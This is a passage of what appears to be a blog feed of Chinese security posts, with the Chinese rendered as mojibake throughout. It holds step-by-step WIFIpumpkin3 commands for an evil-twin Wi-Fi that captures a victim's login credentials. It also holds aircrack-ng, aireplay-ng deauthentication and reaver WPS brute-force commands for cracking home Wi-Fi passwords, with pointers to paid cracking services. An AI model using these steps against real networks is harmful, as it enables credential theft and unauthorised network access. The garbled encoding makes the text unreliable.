successful"><br>å‚æ•°kå¯ä»¥è®¾ç½®å…³é”®è¯<br>config.pyè¿˜å¯ä»¥è®¾ç½®å…³é”®è¯ï¼Œçº¿ç¨‹ï¼Œè¯·æ±‚æ–¹å¼ï¼Œæ˜¯å¦è®°å½•ç­‰ç­‰ï¼Œå¦‚æœä½ æ‡’å¾—å†™è„šæœ¬å¯ä»¥ä½¿ç”¨ï¼Œå¥½å§æˆ‘æ˜¯æ‡’ç‹—</p><p><img src="/images/pasted-11.png" alt="upload successful"></p><h2 id="å‚è€ƒæ–‡ç« åŠè¯´æ˜"><a href="#å‚è€ƒæ–‡ç« åŠè¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« åŠè¯´æ˜"></a>å‚è€ƒæ–‡ç« åŠè¯´æ˜</h2><p>æ–‡ä»¶çš„æ³„éœ²åŸºæœ¬éƒ½æ˜¯äººä¸ºçš„ä¸æ­£å¸¸æ“ä½œå¯¼è‡´çš„ï¼Œå¦‚ç›´æ¥å¤åˆ¶ç½‘ç«™å‘å¸ƒï¼ŒgithubåŒæ­¥ï¼Œgitçš„.gitæœªåˆ é™¤ï¼Œæ³¨æ„ä½¿ç”¨è§„èŒƒï¼ŒæŸ¥çœ‹è‡ªå·±ç½‘ç«™çš„ç›®å½•çš„æ–‡ä»¶ç‰¹åˆ«æ˜¯éšè—æ–‡ä»¶å°±èƒ½å¾ˆå®¹æ˜“çš„å‘ç°æ–‡ä»¶çš„æ³„éœ²ã€‚<br>å‚è€ƒæ–‡ç« :<a href="https://www.cnblogs.com/yesec/p/12232045.html" target="_blank" rel="noopener">https://www.cnblogs.com/yesec/p/12232045.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä¿¡æ¯æ³„éœ² </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®€å•å¿«é€Ÿæ­å»ºé’“é±¼wifi</title>
      <link href="/posts/8b06.html"/>
      <url>/posts/8b06.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é’“é±¼wifiæ˜¯å¾ˆä¹…çš„è¯é¢˜äº†ï¼Œä½†æ˜¯ä¼ ç»Ÿçš„æ–¹æ³•å¯èƒ½æ¯”è¾ƒéº»çƒ¦éœ€è¦æ‰‹åŠ¨é…ç½®dhcpï¼Œdnsï¼Œç½‘å¡ï¼Œæµé‡è½¬å‘ï¼Œæ¯”è¾ƒéº»çƒ¦ï¼Œè€Œä¸”è¿˜æœ‰æ ¹æ®æ¯æ¬¡çš„ç½‘ç»œç¯å¢ƒéœ€è¦é‡æ–°çš„é…ç½®ï¼Œè¿™é‡Œä»‹ç»ç”¨WIFIpumpkin3å·¥å…·ç®€å•å¿«é€Ÿçš„æ­å»ºé’“é±¼wifi</p><h2 id="WIFIpumpkin3çš„å®‰è£…"><a href="#WIFIpumpkin3çš„å®‰è£…" class="headerlink" title="WIFIpumpkin3çš„å®‰è£…"></a>WIFIpumpkin3çš„å®‰è£…</h2><p>WIFIpumpkin3ä¾æ‰˜çš„æ˜¯pythonæ¥æ„å»ºdnsï¼Œdhcpæ‰€ä»¥éœ€è¦pythonç¯å¢ƒä¸”pythonç¯å¢ƒè¦å¤§äº3.7ï¼Œç›®å‰ä¼¼ä¹ä¸æ”¯æŒwindowså’Œmacï¼Œæˆ‘ç”¨çš„kaliä¸Šé¢å·²ç»é›†æˆäº†python3.8çš„ç¯å¢ƒï¼Œæ‰€ä»¥å°±ä¸ä»‹ç»python&gt;=3.7çš„å®‰è£…äº†ï¼Œéœ€è¦çš„è‡ªè¡Œç™¾åº¦ï¼Œä¸‹é¢çš„æ“ä½œéƒ½æ˜¯åœ¨kali2020.2ä¸Šå…¶ä»–ç¯å¢ƒçš„å®‰è£…å‚è€ƒå®˜æ–¹æ–‡æ¡£<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">WIFIpumpkin3</a></p><h3 id="pythonå®‰è£…ä¾èµ–"><a href="#pythonå®‰è£…ä¾èµ–" class="headerlink" title="pythonå®‰è£…ä¾èµ–"></a>pythonå®‰è£…ä¾èµ–</h3><pre><code>sudo apt install libssl-dev libffi-dev build-essential</code></pre><h3 id="å®‰è£…gitï¼Œkaliä¸­ä¼¼ä¹å·²ç»é›†æˆ"><a href="#å®‰è£…gitï¼Œkaliä¸­ä¼¼ä¹å·²ç»é›†æˆ" class="headerlink" title="å®‰è£…gitï¼Œkaliä¸­ä¼¼ä¹å·²ç»é›†æˆ"></a>å®‰è£…gitï¼Œkaliä¸­ä¼¼ä¹å·²ç»é›†æˆ</h3><pre><code>apt-get install git</code></pre><h3 id="ä¸‹è½½WIFIpumpkin3"><a href="#ä¸‹è½½WIFIpumpkin3" class="headerlink" title="ä¸‹è½½WIFIpumpkin3"></a>ä¸‹è½½WIFIpumpkin3</h3><p>é€‰æ‹©åˆé€‚çš„ç›®å½•</p><pre><code>git clone https://github.com/P0cL4bs/wifipumpkin3.git</code></pre><p>ä¸‹è½½å®Œæ¯•è¿›å…¥ç›®å½•</p><pre><code>cd wifipumpkin3</code></pre><h3 id="å®‰è£…PyQt5"><a href="#å®‰è£…PyQt5" class="headerlink" title="å®‰è£…PyQt5"></a>å®‰è£…PyQt5</h3><pre><code>sudo apt install python3-pyqt5</code></pre><p>éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼Œå¦‚æœæ‰“å°äº†doneåˆ™è¡¨ç¤ºå®‰è£…æˆåŠŸ</p><pre><code>python3 -c &quot;from PyQt5.QtCore import QSettings; print(&#39;done&#39;)&quot;</code></pre><h3 id="ç¼–è¯‘å®‰è£…WIFIpumpkin3"><a href="#ç¼–è¯‘å®‰è£…WIFIpumpkin3" class="headerlink" title="ç¼–è¯‘å®‰è£…WIFIpumpkin3"></a>ç¼–è¯‘å®‰è£…WIFIpumpkin3</h3><pre><code>sudo python3 setup.py install</code></pre><p>å¦‚æœæ˜¾ç¤ºä¸‹å›¾è¿™æ ·å°±ä»£è¡¨å®‰è£…æˆåŠŸäº†<br><img src="https://Lmg66.github.io/img/175.png" alt="å›¾ç‰‡"></p><h2 id="WIFIpumpkin3åˆ›å»ºé’“é±¼wifi"><a href="#WIFIpumpkin3åˆ›å»ºé’“é±¼wifi" class="headerlink" title="WIFIpumpkin3åˆ›å»ºé’“é±¼wifi"></a>WIFIpumpkin3åˆ›å»ºé’“é±¼wifi</h2><p>å¯åŠ¨wifipumpkin3</p><pre><code>wifipumpkin3</code></pre><p><img src="https://Lmg66.github.io/img/176.png" alt="å›¾ç‰‡"></p><p>è®¾ç½®ç½‘å¡è¿™é‡Œçš„ç½‘å¡åŒæ ·è¦å…·å¤‡apæ¨¡æ‹Ÿçš„ç½‘å¡ï¼Œwlan0ä¸ºä½ çš„ç½‘å¡</p><pre><code>set interface wlan0 </code></pre><p>è®¾ç½®wifiåç§°ä¹Ÿå°±æ˜¯ssidï¼Œdemoä¿®æ”¹ä¸ºä½ è¦åˆ›å»ºçš„wifi</p><pre><code>set ssid demo</code></pre><p>è®¾ç½®ä»£ç†æ’ä»¶</p><pre><code>set proxy noproxy</code></pre><p>è®¾ç½®dns</p><pre><code>ignore pydns_server</code></pre><p>å¼€å¯é’“é±¼wifi</p><pre><code>start</code></pre><p><img src="https://Lmg66.github.io/img/177.png" alt="å›¾ç‰‡"></p><h2 id="æŸ¥çœ‹åˆ©ç”¨"><a href="#æŸ¥çœ‹åˆ©ç”¨" class="headerlink" title="æŸ¥çœ‹åˆ©ç”¨"></a>æŸ¥çœ‹åˆ©ç”¨</h2><p>è¿™é‡Œæˆ‘ä»¬ç”¨æ‰‹æœºè¿æ¥ä¸€ä¸‹ï¼Œå‘ç°æˆåŠŸåˆ†é…ipä¸”æœ‰ç½‘ç»œ<br><img src="https://Lmg66.github.io/img/178.png" alt="å›¾ç‰‡"></p><p>çœ‹ä¸€ä¸‹kaliï¼Œè¿™é‡Œæ˜¾ç¤ºäº†è¿æ¥è€Œä¸”æ˜¾ç¤ºäº†è¿æ¥çš„æ‰‹æœºçš„å‹å·<br><img src="https://Lmg66.github.io/img/179.png" alt="å›¾ç‰‡"></p><p>ç»§ç»­ï¼Œæˆ‘ä»¬ç”¨æ‰‹æœºç™»å½•ä¸€ä¸ªç½‘ç«™<br><img src="https://Lmg66.github.io/img/180.png" alt="å›¾ç‰‡"><br>çœ‹ä¸€ä¸‹kaliï¼Œå‘ç°æŠ“å–åˆ°äº†è´¦å·å¯†ç ï¼Œè€Œä¸”è¿˜æœ‰æµé‡è®°å½•çš„ä¿¡æ¯å›¾ç‰‡ç­‰ç­‰ï¼Œokwifié’“é±¼å®Œæˆ<br><img src="https://Lmg66.github.io/img/181.png" alt="å›¾ç‰‡"></p><h2 id="å‚è€ƒæ–‡ç« åŠè¯´æ˜"><a href="#å‚è€ƒæ–‡ç« åŠè¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« åŠè¯´æ˜"></a>å‚è€ƒæ–‡ç« åŠè¯´æ˜</h2><p>ä¸Šæ–‡ä»æ¸—é€çš„è§’åº¦è¯´æ˜é™Œç”Ÿifiï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ ‘è“æ´¾ç­‰å°å‹è®¾å¤‡æ”¾å…¥å¤§å‹çš„å…¬å…±åœºæ‰€è®¾ç½®å…è´¹å…¬å…±wifiæ˜¯éå¸¸å¯æ€•çš„ï¼Œæ‰€ä»¥æé†’æœ€å¥½æœ€å¥½æœ€å¥½(é‡è¦çš„äº‹æƒ…è¯´ä¸‰é)ä¸è¦è¿æ¥é™Œç”Ÿçš„wifiå¾ˆå®¹æ˜“ç›—å–ä½ çš„ä¿¡æ¯<br>WIFIpumpkin3è¿˜æœ‰å¾ˆå¤šç”¨é€”å¯ä»¥è‡ªè¡Œæ¢ç´¢ï¼Œæœ¬æ–‡å‚è€ƒåœ°å€:<a href="https://wifipumpkin3.github.io/docs/getting-started" target="_blank" rel="noopener">https://wifipumpkin3.github.io/docs/getting-started</a></p>]]></content>
      
      
      <categories>
          
          <category> æ— çº¿å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ­å»ºé’“é±¼wifi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wifiæ¸—é€</title>
      <link href="/posts/5e65.html"/>
      <url>/posts/5e65.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ¬æ–‡ä¸»è¦è®²è¿° <strong>å®¶åº­å®¶åº­å®¶åº­ä¸­</strong>ï¼ˆé‡è¦çš„äº‹æƒ…è¯´ä¸‰éï¼Œä¼ä¸šè®¤è¯æœåŠ¡å™¨çš„wifiä¸€èˆ¬éå¸¸éå¸¸çš„å®‰å…¨ç ´è§£ä¸æ¥ï¼‰å¦‚ä½•ç ´è§£wifiå¯†ç ï¼Œç ´è§£wifiå¯†ç åçš„å†…ç½‘æ¸—é€åˆ©ç”¨(ç®€å•è¯´æ˜)ï¼Œå¦‚ä½•è®¾ç½®wifiè·¯ç”±å™¨æ›´å®‰å…¨ï¼Œä»æ¸—é€çš„æ–¹é¢çœ‹wifiå®‰å…¨ï¼Œæ ¹æ®éœ€æ±‚é€‰æ‹©è§‚çœ‹</p><h2 id="wifiæ¸—é€ç¯å¢ƒçš„æ‰“é€ "><a href="#wifiæ¸—é€ç¯å¢ƒçš„æ‰“é€ " class="headerlink" title="wifiæ¸—é€ç¯å¢ƒçš„æ‰“é€ "></a>wifiæ¸—é€ç¯å¢ƒçš„æ‰“é€ </h2><h3 id="ç¡¬ä»¶æ–¹é¢"><a href="#ç¡¬ä»¶æ–¹é¢" class="headerlink" title="ç¡¬ä»¶æ–¹é¢"></a>ç¡¬ä»¶æ–¹é¢</h3><p>éœ€è¦æ”¯æŒç›‘å¬æ¨¡å¼çš„æ— çº¿ç½‘å¡ï¼Œä¸€èˆ¬ç”µè„‘è‡ªå¸¦çš„æ— çº¿ç½‘å¡æ˜¯ä¸æ”¯æŒç›‘å¬æ¨¡å¼çš„ï¼Œéœ€è¦è´­ä¹°<br>å†…ç½®kailé©±åŠ¨ RT3070 RTL8187(æ¨èä½¿ç”¨)<br>æˆ‘è´­ä¹°çš„é“¾æ¥å¦‚ä¸‹ï¼Œç”¨ç€è¿˜è¡Œï¼Œç›‘å¬ä¿¡å·æ¯”æ‰‹æœºå¼ºé‚£ä¹ˆä¸€ç‚¹ç‚¹<br><a href="https://m.tb.cn/h.VGGIItU?sm=0b7bf6" target="_blank" rel="noopener">https://m.tb.cn/h.VGGIItU?sm=0b7bf6</a></p><h3 id="è½¯ä»¶æ–¹é¢"><a href="#è½¯ä»¶æ–¹é¢" class="headerlink" title="è½¯ä»¶æ–¹é¢"></a>è½¯ä»¶æ–¹é¢</h3><p>å› ä¸ºwifiç ´è§£éœ€è¦è½¯ä»¶æ”¯æŒï¼ŒWindowsä¸‹è½½éº»çƒ¦ï¼Œæ¨èkali(å› ä¸ºkaliè‡ªå¸¦å¾ˆå¤šå·¥å…·)<br>å› ä¸ºç”¨åˆ°kaliï¼Œå»ºè®®ä½¿ç”¨vmwareè™šæ‹Ÿæœºï¼Œä¸å»ºè®®å°ç™½åŒç³»ç»Ÿkaliæˆ–è€…Microsoft Storeä¸­çš„kali<br>vmwareä¸‹è½½æŸ¥çœ‹ï¼š<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br><strong>æ³¨æ„</strong>ï¼šæ— çº¿ç½‘å¡ç›‘å¬æ¨¡å¼æ—¶å¦‚æœå‡ºç°vmwareå¡ä»£ç ï¼Œç›‘å¬æ—¶é—´é•¿å°±åœæ­¢çš„æƒ…å†µå»ºè®®æ›´æ¢ä¸Šé¢è¿™ä¸ªæ–‡ç« çš„vmwareç‰ˆæœ¬<br>kaliçš„vmé•œåƒä¸‹è½½ï¼Œä¸‹è½½è§£å‹ï¼Œvmwareæ‰“å¼€å³å¯ä½¿ç”¨ï¼Œä¸‹è½½åœ°å€: <a href="https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768" target="_blank" rel="noopener">https://images.offensive-security.com/virtual-images/kali-linux-2020.2a-vmware-amd64.7z?_ga=2.152625529.1921388440.1596879427-46569499.1595490768</a></p><h3 id="vmwareå’Œkaliå’Œæ— çº¿ç½‘å¡åŸºç¡€çŸ¥è¯†-é€‰çœ‹"><a href="#vmwareå’Œkaliå’Œæ— çº¿ç½‘å¡åŸºç¡€çŸ¥è¯†-é€‰çœ‹" class="headerlink" title="vmwareå’Œkaliå’Œæ— çº¿ç½‘å¡åŸºç¡€çŸ¥è¯†(é€‰çœ‹)"></a>vmwareå’Œkaliå’Œæ— çº¿ç½‘å¡åŸºç¡€çŸ¥è¯†(é€‰çœ‹)</h3><h4 id="USBæ— çº¿ç½‘å¡åœ¨kali-Linuxçš„ä½¿ç”¨"><a href="#USBæ— çº¿ç½‘å¡åœ¨kali-Linuxçš„ä½¿ç”¨" class="headerlink" title="USBæ— çº¿ç½‘å¡åœ¨kali Linuxçš„ä½¿ç”¨"></a>USBæ— çº¿ç½‘å¡åœ¨kali Linuxçš„ä½¿ç”¨</h4><ol><li>å…ˆä¸è¦å¼€æœº å…ˆæ‰“å¼€æœåŠ¡<br><img src="https://Lmg66.github.io/img/148.png" alt="å›¾ç‰‡"></li><li>è¿è¡Œä¸‹å›¾çš„<br><img src="https://Lmg66.github.io/img/149.png" alt="å›¾ç‰‡"></li><li>å¼€æœºkaliå è™šæ‹Ÿæœºé€‰æ‹©ç½‘å¡çš„è¿æ¥<br><img src="https://Lmg66.github.io/img/150.png" alt="å›¾ç‰‡"></li><li>ifconfig æŸ¥çœ‹è¿æ¥ä¸€èˆ¬åå­—ä¸ºwlan,ä½†æœ‰è‚¯èƒ½æ— çº¿ç½‘å¡å¤„äºdownçŠ¶æ€å¯ç”¨ifconfig -aæŸ¥çœ‹,ç„¶åä½¿ifconfig name upå³å¯<h4 id="æ— çº¿ç½‘å¡ä¸€èˆ¬æœ‰å››ç§å·¥ä½œæ¨¡å¼ï¼Œå³-Managedï¼ŒMasterï¼ŒAd-hocï¼ŒMonitorã€‚"><a href="#æ— çº¿ç½‘å¡ä¸€èˆ¬æœ‰å››ç§å·¥ä½œæ¨¡å¼ï¼Œå³-Managedï¼ŒMasterï¼ŒAd-hocï¼ŒMonitorã€‚" class="headerlink" title="æ— çº¿ç½‘å¡ä¸€èˆ¬æœ‰å››ç§å·¥ä½œæ¨¡å¼ï¼Œå³ Managedï¼ŒMasterï¼ŒAd-hocï¼ŒMonitorã€‚"></a>æ— çº¿ç½‘å¡ä¸€èˆ¬æœ‰å››ç§å·¥ä½œæ¨¡å¼ï¼Œå³ Managedï¼ŒMasterï¼ŒAd-hocï¼ŒMonitorã€‚</h4>Managed æ¨¡å¼ï¼šè¯¥æ¨¡å¼ç”¨äºä½ çš„æ— çº¿å®¢æˆ·ç«¯ç›´æ¥ä¸æ— çº¿æ¥å…¥ç‚¹ï¼ˆAccess Pointï¼Œå³APï¼‰è¿›è¡Œæ¥å…¥è¿æ¥ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œæ— çº¿æ¥å…¥internetä¸Šç½‘ï¼Œæ— çº¿ç½‘å¡çš„é©±åŠ¨ç¨‹åºä¾èµ–æ— çº¿APç®¡ç†æ•´ä¸ªé€šä¿¡è¿‡ç¨‹ã€‚<br>Master æ¨¡å¼ï¼šä¸€äº›æ— çº¿ç½‘å¡æ”¯æŒMasteræ¨¡å¼ã€‚è¿™ä¸ªæ¨¡å¼å…è®¸æ— çº¿ç½‘å¡ä½¿ç”¨ç‰¹åˆ¶çš„é©±åŠ¨ç¨‹åºå’Œè½¯ä»¶å·¥ä½œï¼Œä½œä¸ºå…¶ä»–è®¾å¤‡çš„æ— çº¿APã€‚å®ƒä¸»è¦ä½¿ç”¨äºæ— çº¿æ¥å…¥ç‚¹APæä¾›æ— çº¿æ¥å…¥æœåŠ¡ä»¥åŠè·¯ç”±åŠŸèƒ½ã€‚æ¯”å¦‚æ— çº¿è·¯ç”±å™¨å°±æ˜¯å·¥ä½œåœ¨Masteræ¨¡å¼ä¸‹äº†ï¼Œå¯¹äºæ™®é€šçš„pcæœºæ¥è¯´ï¼Œå¦‚æœæœ‰åˆé€‚çš„ç¡¬ä»¶å®ƒä¹Ÿå¯ä»¥å˜æˆä¸€å°æ— çº¿APã€‚<br>Ad hocæ¨¡å¼ï¼šå½“ä½ çš„ç½‘ç»œç”±äº’ç›¸ç›´è¿çš„è®¾å¤‡ç»„æˆæ—¶ï¼Œå°±ä½¿ç”¨è¿™ä¸ªæ¨¡å¼ã€‚åœ¨è¿™ä¸ªæ¨¡å¼ä¸­ï¼Œå„è®¾å¤‡ä¹‹é—´é‡‡ç”¨å¯¹ç­‰ç½‘ç»œçš„æ–¹å¼è¿›è¡Œè¿æ¥ï¼Œæ— çº¿é€šä¿¡åŒæ–¹å…±åŒæ‰¿æ‹…æ— çº¿APçš„èŒè´£ã€‚<br>Monitor æ¨¡å¼ï¼šMonitoræ¨¡å¼ä¸»è¦ç”¨äºç›‘æ§æ— çº¿ç½‘ç»œå†…éƒ¨çš„æµé‡ï¼Œç”¨äºæ£€æŸ¥ç½‘ç»œå’Œæ’é”™ã€‚è¦ä½¿Wiresharkæ•è·æ— çº¿æ•°æ®åŒ…ï¼Œä½ çš„æ— çº¿ç½‘å¡å’Œé…å¥—é©±åŠ¨ç¨‹åºå¿…é¡»æ”¯æŒç›‘å¬æ¨¡å¼ï¼ˆä¹Ÿå«RFMONæ¨¡å¼ï¼‰ã€‚<h4 id="kaliæ¡¥æ¥ç½‘å¡ä¸Šç½‘"><a href="#kaliæ¡¥æ¥ç½‘å¡ä¸Šç½‘" class="headerlink" title="kaliæ¡¥æ¥ç½‘å¡ä¸Šç½‘"></a>kaliæ¡¥æ¥ç½‘å¡ä¸Šç½‘</h4><img src="https://Lmg66.github.io/img/151.png" alt="å›¾ç‰‡"><br>å‚è§:<a href="https://www.linuxidc.com/Linux/2016-09/135521p3.htm" target="_blank" rel="noopener">https://www.linuxidc.com/Linux/2016-09/135521p3.htm</a><h2 id="wifiå¯†ç çš„ç ´è§£"><a href="#wifiå¯†ç çš„ç ´è§£" class="headerlink" title="wifiå¯†ç çš„ç ´è§£"></a>wifiå¯†ç çš„ç ´è§£</h2>å› ä¸ºwepåŠ å¯†å·²ç»æ²¡æœ‰ä½¿ç”¨çš„ï¼Œéå¸¸ä¸å®‰å…¨ï¼Œå°±å¿½ç•¥äº†<h3 id="æœ€ç®€å•æœ€å¥½ç”¨çš„wifiå¯†ç ç ´è§£æ–¹æ³•"><a href="#æœ€ç®€å•æœ€å¥½ç”¨çš„wifiå¯†ç ç ´è§£æ–¹æ³•" class="headerlink" title="æœ€ç®€å•æœ€å¥½ç”¨çš„wifiå¯†ç ç ´è§£æ–¹æ³•"></a>æœ€ç®€å•æœ€å¥½ç”¨çš„wifiå¯†ç ç ´è§£æ–¹æ³•</h3>ä½¿ç”¨wifiä¸‡èƒ½é’¥åŒ™ï¼Œè…¾è®¯wifiç®¡å®¶ç­‰ç­‰ï¼Œå…¶åŸç†å°±æ˜¯wifiå¯†ç å…±äº«ï¼Œä½¿ç”¨è¿‡è¯¥è½¯ä»¶ä¼šå°†ä½ çš„è¿æ¥è¿‡çš„wifiå¯†ç å…±äº«å‡ºå»ï¼Œå…¶æœ¬èº«ä¸æ˜¯ç ´è§£è€Œæ˜¯å…±äº«åˆ¶ï¼Œè¿æ¥åæˆ‘ä»¬å°±å¯ä»¥çœ‹è§å¯†ç äº†ï¼Œæ‰€ä»¥è¿™ç§ç ´è§£æ–¹æ³•éå¸¸çš„å¥½ç”¨ï¼Œé¦–å…ˆæ¨è<h3 id="åŸºç¡€è¯´æ˜airodump-ng"><a href="#åŸºç¡€è¯´æ˜airodump-ng" class="headerlink" title="åŸºç¡€è¯´æ˜airodump-ng"></a>åŸºç¡€è¯´æ˜airodump-ng</h3><pre><code>airmon-ng start wlan0     å¼€å¯ç›‘å¬æ¨¡å¼airodump-ng wlan0mon      å¼€å§‹æ‰«æé™„è¿‘wifi</code></pre>airodump-ng wlan0monå‚æ•°ï¼š</li></ol><p>-w    è¾“å‡ºæ–‡ä»¶<br>â€“ivs    åªä¿å­˜ivsï¼Œä¸å†ä¿å­˜æ‰€æœ‰æ— çº¿æ•°æ®ï¼Œåªæ˜¯ä¿å­˜å¯ä»¥ç”¨äºç ´è§£çš„IVSæ•°æ®æŠ¥æ–‡<br>-c    æŒ‡å®šä¿¡é“<br>â€“bssid    æŒ‡å®šè·¯ç”±çš„bssidä¹Ÿå°±æ˜¯MACåœ°å€<br>â€“essid    æŒ‡å®šè·¯ç”±çš„essidï¼Œå¯ä»¥ç†è§£ä¸ºwifiåç§°ï¼ˆä¸å‡†ç¡®ï¼‰<br>airodump-ng wlan0mon æ‰«æå‚æ•°<br><img src="https://Lmg66.github.io/img/152.png" alt="å›¾ç‰‡"><br>    BSSID    APçš„MACåœ°å€<br>    PWR    ä¿¡å·å¼ºåº¦æ¥è¿‘0ä¿¡å·å¥½<br>    Beacons    æ— çº¿apçš„å‘é€é€šå‘Šï¼Œå‘Šè¯‰æˆ‘æ˜¯è° å‘¨æœŸå‘é€<br>    #Data    æŠ“åˆ°çš„æ•°æ®åŒ…<br>    CH    ä¿¡é“<br>    MB    æœ€å¤§ä¼ è¾“é€Ÿåº¦<br>    ENC    åŠ å¯†æ–¹æ³•<br>    CIPHER    åŠ å¯†ç®—æ³•<br>    AUTH    è®¤è¯åè®®<br>    ESSID    é€šæŒ‡wifiåå­— æ— åè¡¨ç¤ºæœªå¹¿æ’­<br>    STATION    å®¢æˆ·ç«¯<br>    RATE    ä¼ è¾“é€Ÿç‡<br>    Lost    æœ€è¿‘10ç§’çš„ä¸¢åŒ…æ•°<br>    Frames    æ¥è‡ªå®¢æˆ·ç«¯çš„æ•°æ®<br>    Probes    ä¸»åŠ¨å¼¹å‡º å¦‚æœå®¢æˆ·ç«¯æ­£è¯•å›¾è¿æ¥ä¸€ä¸ªAPä½†æ²¡æœ‰è¿ä¸Šï¼Œä¼šæ˜¾ç¤ºè¿™é‡Œ<br>Aircrack-ngå·¥å…·åŒ…</p><ul><li>aircrack-ng ç ´è§£</li><li>airmon-ng æ”¹å˜ç½‘å¡å·¥ä½œæ¨¡å¼</li><li>airodump-ng æ•è·æŠ¥æ–‡</li><li>aireplay-ng æä¾›å„ç§æ”»å‡»</li><li>airserv-ng ç½‘å¡è¿æ¥åˆ°æŒ‡å®šç«¯å£ ç”¨ä½œæ— é™è·³æ¿</li><li>airolib-ng å½©è™¹è¡¨ç ´è§£åˆ›å»ºæ•°æ®åº“æ–‡ä»¶</li><li>airdecap-ng è§£åŒ…<h3 id="WPAç ´è§£"><a href="#WPAç ´è§£" class="headerlink" title="WPAç ´è§£"></a>WPAç ´è§£</h3>æŒ‡å®šç›‘å¬çš„wifi<br>airodump-ng -w [æ–‡ä»¶] â€“bssid [wifibssid] -c [ä¿¡é“æœ€å¥½æŒ‡å®š] wlan0mon<br><img src="https://Lmg66.github.io/img/153.png" alt="å›¾ç‰‡"><br>ç®¡ç†é’ˆæ”»å‡»å°†å…¶ä»–ç”¨æˆ·è¸¢ä¸‹çº¿<br>aireplay-ng -0 5 -a [è·¯ç”±bssid] -c [å®¢æˆ·ç«¯STATION] wlan0mon<br><img src="https://Lmg66.github.io/img/154.png" alt="å›¾ç‰‡"><br>ç®¡ç†é’ˆæ”»å‡»è·å¾—æ¡æ‰‹åŒ…<br><img src="https://Lmg66.github.io/img/155.png" alt="å›¾ç‰‡"><br>å¦‚æœå‡ºç°é”™è¯¯å¯å°è¯•<br>â€“ignore-negative-one           å¿½ç•¥-1ä¿¡é“<br>æ ¹æ®æ¡æ‰‹åŒ…æš´åŠ›ç ´è§£å¯†ç <br>aircrack-ng -w [å¯†ç å­—å…¸] [æ¡æ‰‹åŒ….cap]<br><img src="https://Lmg66.github.io/img/156.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/157.png" alt="å›¾ç‰‡"><br><img src="https://Lmg66.github.io/img/158.png" alt="å›¾ç‰‡"><br>æ ¹æ®æ¡æ‰‹åŒ…ç ´è§£å¯†ç åŠ é€Ÿ<br>è¿™é‡Œæ¨èä½¿ç”¨windowsä¸‹GPUåŠ é€Ÿå·¥å…·EWSAï¼Œè¿˜æœ‰å…¶ä»–åŠ é€Ÿæ–¹å¼ä¸è¿‡æˆ‘ä¸æ€ä¹ˆæ¨èï¼Œä¹Ÿå¯ä»¥æ‰¾ä¸“ä¸šçš„è·‘åŒ…å›¢é˜Ÿæ¥è·‘åŒ…<br>EWSAä¸‹è½½å’Œä½¿ç”¨è¯´æ˜åœ°å€:<a href="https://www.52pojie.cn/thread-989800-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-989800-1-1.html</a><br>æ‰¾è·‘åŒ…åœ°å€ï¼š<a href="https://www.anywlan.com/forum-134-1.html" target="_blank" rel="noopener">https://www.anywlan.com/forum-134-1.html</a><h3 id="pingæ”»å‡»-å‰æè·¯ç”±å™¨å¼€å¯wps"><a href="#pingæ”»å‡»-å‰æè·¯ç”±å™¨å¼€å¯wps" class="headerlink" title="pingæ”»å‡» å‰æè·¯ç”±å™¨å¼€å¯wps"></a>pingæ”»å‡» å‰æè·¯ç”±å™¨å¼€å¯wps</h3>8ä½pingç ï¼Œç¬¬8ä½æ•°æ˜¯æ ¡éªŒç ï¼Œåªéœ€è¦ç ´è§£ä¸ƒä½ï¼Œpingç åˆ†å‰éƒ¨åˆ†(4ä½)åéƒ¨åˆ†(3ä½)ï¼Œpinè®¤è¯è¿æ¥å¤±è´¥ï¼Œè·¯ç”±å™¨è¿”å›EAP-NACKä¿¡æ¯ï¼Œé€šè¿‡å›åº”ï¼Œèƒ½å¤Ÿç¡®å®špinçš„å‰éƒ¨åˆ†æˆ–åéƒ¨åˆ†æ˜¯å¦æ­£ç¡®ï¼Œæ‰€ä»¥å¯èƒ½æ€§æ˜¯11000(10^4+10^3),ä¸è¿‡è€ƒè™‘ä¿¡å·å’Œè·¯ç”±å™¨çš„å¤„ç†æ€§èƒ½ç½‘å¡åŠŸç‡ç­‰å¯èƒ½æ—¶é—´ä¼šé•¿ï¼Œå¦‚æœä¿¡å·å¥½ï¼Œç½‘å¡ï¼Œè·¯ç”±å™¨ä¹Ÿæ¯”è¾ƒå¥½ä¸€èˆ¬éœ€è¦6ä¸ªå°æ—¶å·¦å³<br>æŸ¥çœ‹å¼€å¯wpsçš„wifi<pre><code>wash -i wlan0mon</code></pre><img src="https://Lmg66.github.io/img/159.png" alt="å›¾ç‰‡"><br>reaver -I wlan0mon -b [BSSID] -vv è¿˜å¯ä»¥åŠ å…¶ä»–å‚æ•° è¿›è¡Œçˆ†ç ´<br><img src="https://Lmg66.github.io/img/160.png" alt="å›¾ç‰‡"><h3 id="kaliè‡ªåŠ¨åŒ–å·¥å…·wifite"><a href="#kaliè‡ªåŠ¨åŒ–å·¥å…·wifite" class="headerlink" 